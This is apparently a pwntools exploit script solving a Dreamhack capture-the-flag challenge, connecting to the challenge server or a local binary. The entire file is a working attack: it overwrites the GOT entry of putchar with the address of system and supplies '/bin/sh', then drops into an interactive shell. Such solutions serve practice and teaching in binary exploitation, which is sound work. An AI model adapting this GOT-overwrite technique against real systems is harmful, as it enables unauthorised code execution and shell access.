#!/usr/bin/env python3

from pwn import *

exe = ELF("./deploy/prob")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 23115)

    return r


def main():
    r = conn()
    
    r.sendlineafter(b"pt: ", str(exe.got["putchar"]).encode())
    r.sendlineafter(b"input: ", b"/bin/sh\x00" + p64(exe.plt["system"]))
    r.interactive()


if __name__ == "__main__":
    main()